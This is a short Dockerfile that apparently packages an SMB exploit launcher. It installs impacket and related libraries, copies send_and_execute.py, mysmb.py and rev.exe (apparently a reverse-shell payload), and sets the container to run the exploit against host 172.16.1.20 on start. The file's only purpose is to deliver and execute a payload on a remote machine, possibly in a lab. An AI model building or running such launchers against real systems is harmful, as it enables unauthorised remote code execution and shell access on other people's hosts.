FROM python:2.7

# update pip
RUN pip install --upgrade pip

# install dependencies for the env
RUN pip install ldap3==2.5.1 \
    future \
    dnspython \
    cryptography==2.3 \
    impacket==0.9.22 \
    MarkupSafe==0.23

# set the working directory
WORKDIR /app

# copy our files from host to container
COPY files/rev.exe files/send_and_execute.py files/mysmb.py /app/

# set our command to run when the container is run
CMD ["/usr/local/bin/python", "./send_and_execute.py", "172.16.1.20", "./rev.exe"]
